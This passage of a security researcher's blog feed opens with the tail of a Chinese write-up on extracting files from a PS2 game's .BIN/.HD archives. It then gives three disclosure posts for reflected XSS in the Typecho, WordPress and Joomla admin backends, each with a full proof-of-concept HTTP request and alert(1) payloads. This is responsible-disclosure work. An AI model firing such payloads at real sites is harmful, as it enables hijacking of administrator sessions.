src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/5.jpg" alt="Not Found"></p><p>尽管目前可以看到某种类似脚本语言的明文代码，但是每隔一段代码都会出现大量的 <code>0xff</code></p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/6.jpg" alt="Not Found"></p><p>同时打开其他几个 <code>.BIN</code> 文件，也可以看到每隔一段就会出现大量的 <code>0xff</code>，并且出现的数量并不确定，但是总是会填充到整数后出现其他内容，推测 <code>0xff</code> 可能用于填充对其并分割不同文件，例如下图中 <code>SYSTEM.BIN</code> 的第一段代码被 <code>0xff</code> 填充并对齐到了 0x1800，作为一个 chunk</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/7.jpg" alt="Not Found"></p><p>继续向后分析几段，可以发现每一个 chunk 的大小都是不同的，但都是整数，其实分析到这里基本可以确定大量的 <code>0xff</code> 的作用就是分隔文件内容，但是至于为什么要填充到某个具体的整数，原因未知，例如 <code>SYSTEM.BIN</code> 第一个 chunk 为什么填充到 0x1800 而不是 0x1700。</p><p>继续分析 <code>SYSTEM.HD</code> 中的内容</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/8.jpg" alt="Not Found"></p><p>第一眼就可以看到大量的 <code>00 00</code>，少部分的 <code>01 00</code>，根据经验推测很有可能是小端存储的 int，每 4 个字节作为一个数字，查看其他几个 <code>.HD</code> 文件也可以看出 <code>.HD</code> 文件大小一定是 4 的倍数。但是每个 int 并没有什么规律，有大有小，也没有经过排序。</p><p>根据以往的逆向经历，例如对阴阳师 <code>.npk</code> 的逆向，通过头表（Header Table）中存储的偏移 offset 和文件长度 length 这两个值就可以从打包存储的数据中提取指定位置的文件，因此这个 int 一定是 offset 或者 length 之一，才会与 <code>.BIN</code> 相对应。假如 int 表示的是 offset，存储偏移的表通常是有顺序的，并且偏移一定是唯一的，而在某些 <code>.HD</code> 文件中出现了重复的值，因此这里的 int 一定不是偏移，怀疑可能是 length。</p><p>根据前文的结论，<code>.BIN</code> 的一个 chunk 前一部分保存了文件内容，后一部分保存 <code>0xff</code> 用于对齐分隔，假设 <code>.HD</code> 中第一个值 0x131e 对应的是 <code>.BIN</code> 中的第一个文件内容的长度而不是 chunk 的长度，验证一下</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/9.jpg" alt="Not Found"></p><p><code>SYSTEM.BIN</code> 中第一个文件内容长度刚好是 0x131e，对应 <code>SYSTEM.HD</code> 的第一个小端 int <code>1E 13 00 00</code>，再验证一下下一个 chunk 刚好也是 0x15e4，对应 <code>SYSTEM.HD</code> 的第二个小端 int <code>E4 15 00 00</code></p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/10.jpg" alt="Not Found"></p><p>验证其他几个 <code>.BIN</code> 和 <code>.HD</code> 也可以得到同样的结论。到此，基本就可以确定 <code>.HD</code> 中保存的就是 <code>.BIN</code> 中每个文件内容的长度，并且每个文件内容后会被填充大量的 <code>0xff</code> 分隔同时对其到某个整数。那么基于此，可以写出对应的提取脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># =======================================================</span></span><br><span class="line"><span class="comment"># Author: Srpopty</span></span><br><span class="line"><span class="comment"># Email: srpopty@outlook.com</span></span><br><span class="line"><span class="comment"># FileName: extract.py</span></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment">#     Extract files from .BIN by .HD in some ps2 games.</span></span><br><span class="line"><span class="comment"># ========================================================</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">name, ext=<span class="string">&quot;dat&quot;</span></span>):</span><br><span class="line">    output_dir = <span class="string">&quot;./&quot;</span> + name + <span class="string">&quot;_extracted&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(output_dir):</span><br><span class="line">        os.mkdir(output_dir)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Extracting &quot;%s&quot; to &quot;%s&quot;...&#x27;</span> % (name, output_dir))</span><br><span class="line"></span><br><span class="line">    hd_file = name + <span class="string">&quot;.HD&quot;</span></span><br><span class="line">    hd_filesize = os.path.getsize(hd_file)</span><br><span class="line">    hd_file = <span class="built_in">open</span>(hd_file, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">    bin_file = name + <span class="string">&quot;.BIN&quot;</span></span><br><span class="line">    bin_filesize = os.path.getsize(bin_file)</span><br><span class="line">    bin_file = <span class="built_in">open</span>(bin_file, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> hd_filesize % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  Invalid head file size: &quot;</span> + <span class="built_in">hex</span>(hd_filesize))</span><br><span class="line">        bin_file.close()</span><br><span class="line">        hd_file.close()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  Head file size: &quot;</span> + <span class="built_in">hex</span>(hd_filesize))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  Bin file size: &quot;</span> + <span class="built_in">hex</span>(bin_filesize))</span><br><span class="line"></span><br><span class="line">    file_count = hd_filesize &gt;&gt; <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  Total %d files to be extracted.&quot;</span> % file_count)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(file_count):</span><br><span class="line">        filesize = struct.unpack(<span class="string">&quot;&lt;i&quot;</span>, hd_file.read(<span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">        filename = os.path.join(</span><br><span class="line">            output_dir,</span><br><span class="line">            <span class="string">&quot;%d_%s_%s.%s&quot;</span> % (i, <span class="built_in">hex</span>(bin_file.tell())[<span class="number">2</span>:], <span class="built_in">hex</span>(filesize)[<span class="number">2</span>:], ext),</span><br><span class="line">        )</span><br><span class="line">        data = bin_file.read(filesize)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(data)</span><br><span class="line"></span><br><span class="line">        chunk_size = filesize</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = bin_file.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">b&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> data != <span class="string">b&quot;\xff&quot;</span>:</span><br><span class="line">                bin_file.seek(-<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            chunk_size += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&#x27;    [%d] Extracted file to &quot;%s&quot; with filesize %s in chunk size %s&#x27;</span></span><br><span class="line">            % (i, filename, <span class="built_in">hex</span>(filesize), <span class="built_in">hex</span>(chunk_size))</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bin_file.tell() != bin_filesize:</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&quot;  Bin file not finished! Current offset in %s but filesize is %s!&quot;</span></span><br><span class="line">            % (<span class="built_in">hex</span>(bin_file.tell()), <span class="built_in">hex</span>(bin_filesize))</span><br><span class="line">        )</span><br><span class="line">    bin_file.close()</span><br><span class="line">    hd_file.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        main(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        main(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 CD 根目录执行脚本 <code>python extract.py &lt;name&gt; [ext=dat]</code>，例如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python extract.py SYSTEM</span><br></pre></td></tr></table></figure><p>同时可以指定提取出的文件后缀，默认是 <code>.dat</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python extract.py SYSTEM py</span><br></pre></td></tr></table></figure><p>提取出的文件后保存在 <code>&lt;name&gt;_extracted</code> 目录中，例如 <code>SYSTEM_extracted</code>，文件名为 <code>id_offset_length.ext</code>，其中 <code>id</code> 为文件序号，按照文件出现的顺序从 0 开始，<code>offset</code> 为文件在 <code>.BIN</code> 中的偏移，<code>length</code> 为 <code>.HD</code>中保存的文件内容大小。</p><p>最后按顺序提取出 <code>NORMAL.BIN</code>，<code>SCENE_ID.BIN</code>，<code>SCENEDAT.BIN</code>，<code>SOUND_ID.BIN</code>，<code>SYSTEM.BIN</code> 以及 <code>VOICE_ID.BIN</code> 中的所有文件。</p>]]></content>
    
    
    <summary type="html">一个Web狗针对某上古时期的PlayStation2游戏的逆向以及资源提取记录。</summary>
    
    
    
    <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
    
    
    <category term="ReverseEngineering" scheme="https://srpopty.github.io/tags/ReverseEngineering/"/>
    
  </entry>
  
  <entry>
    <title>Typecho V1.2.0 Backend Reflected XSS</title>
    <link href="https://srpopty.github.io/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/"/>
    <id>https://srpopty.github.io/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/</id>
    <published>2023-03-02T07:25:53.000Z</published>
    <updated>2023-03-02T07:25:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Typecho admin backend Comment Manager <code>/admin/manage-comments.php</code> with reflected-XSS via unfiltered POST parameter <code>cid</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Typecho &lt;= 1.2.0</p><p><img src="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to typecho admin backend management system.</li><li>In Comment Manager <code>/admin/manage-comments.php</code>, the unfiltered <code>$request-&gt;cid</code> is directly echoed to html.</li></ol><p><img src="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/6.png"></p><p>The full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/typecho/admin/manage-comments.php?status=wating&amp;category=&amp;keywords=abc&amp;__typecho_all_posts=off&amp;uid=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.10</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.0.10/cms/typecho/admin/login.php?referer=http%3A%2F%2F192.168.0.10%2Fcms%2Ftypecho%2Fadmin%2Fmanage-comments.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>745020ecd4b17dde48d43755702a78b4__typecho_uid=1; 745020ecd4b17dde48d43755702a78b4__typecho_authCode=%24T%249aGUcl7K02f405471bbdacf65892bf8ffb75bc211; PHPSESSID=m7h7isuus6cugk6mb58vdah296; u5DD_2132_saltkey=ql9191Ym; u5DD_2132_lastvisit=1677486351; u5DD_2132_seccodecSASGLE52ETX=1.1b4fba6d0be0f7dce2; u5DD_2132_ulastactivity=dd6b5bfUH2dwkFNJ5HnOvs2bnRKl16bY2TMsiYWsOsPOeru7pyMl; u5DD_2132_auth=ade9wjKb33QiAdI8RrnDloFyK4vB8ca3sx7pIgT0BNlWPo1CeA%2Bsk87ST8rZ%2FVqZTdeIhOInVMfZCF8zm7uu; u5DD_2132_lastcheckfeed=1%7C1677489964; u5DD_2132_nofavfid=1; u5DD_2132_home_diymode=1; u5DD_2132_visitedfid=2; u5DD_2132_smile=1D1; u5DD_2132_home_readfeed=1677497943; u5DD_2132_forum_lastvisit=D_2_1677498054; u5DD_2132_st_t=1%7C1677498055%7C9149ebde1ec47006277ae3faf93f0e2f; u5DD_2132_editormode_e=1; u5DD_2132_st_p=1%7C1677498095%7C926ebc78300a154f5ad9ebb023eb0b77; u5DD_2132_viewid=tid_1; u5DD_2132_seccode=5.792e3c6d8b004d4403; u5DD_2132_seccodecSE52ETX=6.a73b7daa353701b59a</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>44</span><br><span class="line"></span><br><span class="line"><span class="language-xml">coid[]=1&amp;cid=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!--</span></span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/2.png"></p><p><img src="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/3.png"></p><p><img src="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/4.png"></p><p><img src="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/5.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/typecho/typecho/issues/1539">Github Issue</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">Typecho-V1.2.0 with Backend Reflected Cross-Site Scripting in backend /admin/manage-comments.php via unfiltered POST parameter &quot;cid&quot;.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>WordPress V6.2 Backend Reflected-XSS</title>
    <link href="https://srpopty.github.io/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/"/>
    <id>https://srpopty.github.io/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/</id>
    <published>2023-02-27T08:19:35.000Z</published>
    <updated>2023-02-27T08:19:35.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend theme file editor component with reflected-XSS via POST parameter <code>newcontent</code> when the POST parameter <code>theme</code> does not exist.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>WordPress &lt;= 6.2</p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin background management, editing a theme file in theme file editor component.</li><li>POST to <code>/wp-admin/theme-editor.php</code> with the right wordpress nonce, as well as the <code>newcontent</code> parameter which contains the XSS payload, e.g. <code>&lt;/textarea&gt;&lt;img src=x onerror=alert(1)&gt;&lt;!--</code>, remove the <code>theme</code> parameter at the same time.</li></ol><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/2.png"></p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/3.png"></p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/4.png"></p><p>In source code of <code>/wp-admin/theme-editor.php</code>, at line 125, the <code>newcontent</code> passes to <code>$post_content</code>, but <code>wp_unslash</code> does not filter any XSS payload.</p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/5.png"></p><p>At line 129, <code>$post_content</code> passes to <code>$content</code>, and at line 291, the <code>$content</code> is directly echoed to html.</p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/6.png"></p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/7.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/wordpress/wp-admin/theme-editor.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.10</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>193</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.0.10</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.0.10/cms/wordpress/wp-admin/theme-editor.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>wordpress_a59a53e68d3cbba0d705bf0e4b02207b=admin%7C1678689608%7C1S0SKogKJyuDtqkpi3cDcwCyeAvKDNdQ6OW4BtMYgJQ%7Caf4d97cb01e4752e872af6fc5226c89263904830dda087656dbbd0fa79fcf29a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_a59a53e68d3cbba0d705bf0e4b02207b=admin%7C1678689608%7C1S0SKogKJyuDtqkpi3cDcwCyeAvKDNdQ6OW4BtMYgJQ%7Ce2441da59527b55b9831572be4c5a5955c9acb44a4d72e2477feabfbb4efba21; wp-settings-time-1=1677480056; PHPSESSID=m7h7isuus6cugk6mb58vdah296</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">nonce<span class="operator">=</span>f<span class="number">8</span>bc<span class="number">8439</span>a<span class="number">1</span>&amp;_wp_http_referer<span class="operator">=</span><span class="variable">%2</span>Fcms<span class="variable">%2</span>Fwordpress<span class="variable">%2</span>Fwp-admin<span class="variable">%2</span>Ftheme-editor.php&amp;newcontent<span class="operator">=</span>&lt;/textarea&gt;&lt;img<span class="variable">%20</span>src<span class="operator">=</span><span class="keyword">x</span><span class="variable">%20</span>onerror<span class="operator">=</span>alert(<span class="number">1</span>)&gt;&lt;<span class="title">!--</span>&amp;action<span class="operator">=</span>update&amp;file<span class="operator">=</span>style.css&amp;themexxx<span class="operator">=</span>twentytwentythree</span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://hackerone.com/bugs?report_id=1888329&subject=user">HackerOne</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">WordPress-V6.2 with Reflected-XSS in backend /wp-admin/theme-editor.php.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Joomla V4.2.8 Backend Reflected-XSS</title>
    <link href="https://srpopty.github.io/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/"/>
    <id>https://srpopty.github.io/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/</id>
    <published>2023-02-27T07:24:16.000Z</published>
    <updated>2023-02-27T07:24:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend Multi-factor Authentication component with reflected-XSS via base64-encoded GET parameters <code>returnurl</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Joomla &lt;= 4.2.8</p><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to Joomla CMS admin backend management, enter into the Multi-factor Authentication component.</li><li>No matter add a new or edit an existed multi-factor authentication method, there is always a base64-encoded URL parameter <code>returnurl</code>.</li><li>The value of <code>returnurl</code> will be decoded by base64 and appeared in html attribute <code>href</code> of <code>&lt;a&gt;</code> tag, which in the “Save &amp; Close” and “Cancel” button.</li><li>Change the value of <code>returnurl</code> to base64-encoded XSS payload, e.g. <code>amF2YXNjcmlwdDphbGVydCgxKTs=</code>, which is the <code>javascript: alert(1)</code>, and request the page with <code>returnurl</code> parameter, the payload will be injected to the “href”.</li></ol><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/2.png"></p><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/3.png"></p><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/4.png"></p><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/5.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/joomla/administrator/index.php?option=com_users&amp;task=method.add&amp;method=yubikey&amp;user_id=220&amp;returnurl=amF2YXNjcmlwdDphbGVydCgxKTs%3D</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>atumSidebarState=open; 8bf89f010a5bbff54669e4ad47111f59=8nunecujukuvngvnu63fptrr0t; c04ce7edc2a8825a69f250555054fe73=ujj34jaqqm0md1cihnph0q3a20; PHPSESSID=enl8bvb5tmdfidt9kmvvekicr7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://huntr.dev/bounties/1fb9daa4-417a-4730-bb9e-46ea0b865184">huntr</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">Joomla-V4.2.8 with Reflected-XSS in backend /administrator/index.php.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>DedeCMS V5.7.160 Backend Blind SQL Injection</title>
    <link href="https://srpopty.github.io/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-group/"/>
    <id>https://srpopty.github.io/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-group/</id>
    <published>2023-02-26T16:38:53.000Z</published>
    <updated>2023-02-26T16:38:53.000Z</updated>
    
